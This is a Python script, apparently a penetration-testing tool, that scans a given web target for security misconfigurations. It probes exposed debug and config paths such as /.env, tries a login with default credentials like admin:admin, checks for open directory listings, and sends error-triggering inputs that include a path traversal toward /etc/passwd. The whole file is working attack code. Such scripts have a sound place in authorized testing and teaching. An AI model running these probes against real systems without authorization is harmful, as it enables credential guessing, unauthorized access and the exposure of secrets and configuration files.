#!/usr/bin/env python3

import requests
import sys

class SecurityMisconfigurationExploit:
    def __init__(self, target_url):
        self.target_url = target_url
        self.session = requests.Session()
    
    def test_debug_endpoints(self):
        print("[+] Testing debug and admin endpoints...")
        
        debug_paths = [
            '/debug',
            '/admin',
            '/config',
            '/status',
            '/info',
            '/health',
            '/metrics',
            '/.env',
            '/package.json',
            '/server.js'
        ]
        
        for path in debug_paths:
            response = self.session.get(f"{self.target_url}{path}")
            if response.status_code == 200:
                print(f"[SUCCESS] Exposed endpoint: {path}")
    
    def test_default_credentials(self):
        print("[+] Testing default credentials...")
        
        default_creds = [
            ('admin', 'admin'),
            ('admin', 'password'),
            ('root', 'root'),
            ('admin', '123456'),
            ('test', 'test')
        ]
        
        for username, password in default_creds:
            data = {'username': username, 'password': password}
            response = self.session.post(f"{self.target_url}/login", data=data)
            if response.status_code == 302:
                print(f"[SUCCESS] Default credentials work: {username}:{password}")
    
    def test_directory_listing(self):
        print("[+] Testing directory listing...")
        
        directories = [
            '/uploads/',
            '/public/',
            '/files/',
            '/backup/',
            '/logs/'
        ]
        
        for directory in directories:
            response = self.session.get(f"{self.target_url}{directory}")
            if "Index of" in response.text or "<title>Directory" in response.text:
                print(f"[SUCCESS] Directory listing enabled: {directory}")
    
    def test_error_disclosure(self):
        print("[+] Testing error information disclosure...")
        
        error_triggers = [
            "/'",
            "/nonexistent",
            "/?debug=true",
            "/?test=../../../etc/passwd"
        ]
        
        for trigger in error_triggers:
            response = self.session.get(f"{self.target_url}{trigger}")
            if "Error:" in response.text or "Exception:" in response.text:
                print(f"[SUCCESS] Error disclosure: {trigger}")
    
    def run_all_tests(self):
        print("=" * 60)
        print("SECURITY MISCONFIGURATION TESTING")
        print("=" * 60)
        
        self.test_debug_endpoints()
        self.test_default_credentials()
        self.test_directory_listing()
        self.test_error_disclosure()
        
        print("\n[INFO] Security misconfiguration testing completed!")

def main():
    if len(sys.argv) != 2:
        print("Usage: python3 security_misconfiguration.py <target_url>")
        sys.exit(1)
    
    target_url = sys.argv[1].rstrip('/')
    exploit = SecurityMisconfigurationExploit(target_url)
    exploit.run_all_tests()

if __name__ == "__main__":
    main()